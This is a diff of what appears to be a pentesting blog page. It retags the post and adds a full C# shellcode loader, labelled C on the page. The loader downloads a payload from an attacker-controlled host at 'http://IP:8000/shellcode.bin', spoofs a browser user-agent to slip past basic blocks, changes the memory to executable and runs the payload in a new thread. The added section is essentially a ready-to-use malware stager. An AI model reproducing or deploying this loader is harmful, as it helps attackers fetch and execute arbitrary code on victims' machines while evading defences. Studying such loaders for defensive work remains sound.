@@ -174,7 +174,7 @@
           <span class="text-gray-400 text-sm font-medium" style="font-family: 'Press Start 2P', monospace; font-size: 10px;">Categories: </span>
           
             <span class="inline-block bg-gradient-to-r from-blue-600 to-blue-500 text-white px-3 py-1 rounded-full text-xs font-medium mr-2 mb-1 hover:from-blue-500 hover:to-blue-400 transition-all duration-200 shadow-sm" style="font-family: 'Press Start 2P', monospace; font-size: 8px; padding: 6px 12px;">
-              My-research
+              Pentesting
             </span>
           
         </div>
@@ -412,6 +412,92 @@ int main() {
     return 0;
 }
 
+</code></pre>
+  
+</div>
+
+<h4 id="or">OR</h4>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">C</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  
+  <pre><code class="Terminal">
+# using System;
+# using System.Net;
+# using System.Runtime.InteropServices;
+
+public class Program {
+    // Change this to your IP address where you are hosting the file
+    private static string URL = "http://IP:8000/shellcode.bin"; 
+
+    // WINAPI IMPORTS
+    private static UInt32 MEM_COMMIT = 0x1000;
+    private static UInt32 PAGE_READWRITE = 0x04; 
+    private static UInt32 PAGE_EXECUTE_READ = 0x20;
+
+    [DllImport("kernel32")]
+    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+    [DllImport("kernel32")]
+    private static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);
+
+    [DllImport("kernel32")]
+    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+    [DllImport("kernel32")]
+    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+    public static void Main()
+    {
+        // 1. Download the Shellcode
+        byte[] shellcode = null;
+        try 
+        {
+            Console.WriteLine($"[*] Contacting {URL}...");
+            
+            // WebClient is simple and effective for fetching raw bytes
+            using (WebClient client = new WebClient())
+            {
+                // mimic a real browser user-agent to avoid basic blocks
+                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+                
+                // DownloadData returns a byte[] directly
+                shellcode = client.DownloadData(URL);
+            }
+
+            Console.WriteLine($"[+] Download successful! Size: {shellcode.Length} bytes");
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"[-] Network Error: {ex.Message}");
+            return;
+        }
+
+        // 2. Allocate Memory (RW)
+        Console.WriteLine("[*] Allocating memory...");
+        IntPtr codeAddr = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
+
+        // 3. Copy Shellcode
+        Marshal.Copy(shellcode, 0, codeAddr, shellcode.Length);
+
+        // 4. Change to Executable (RX)
+        UInt32 oldProtect;
+        VirtualProtect(codeAddr, (UInt32)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
+
+        // 5. Execute
+        Console.WriteLine("[*] Executing...");
+        UInt32 threadId = 0;
+        IntPtr threadHandle = CreateThread(0, 0, codeAddr, IntPtr.Zero, 0, ref threadId);
+
+        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+    }
+}
 </code></pre>
   
 </div>
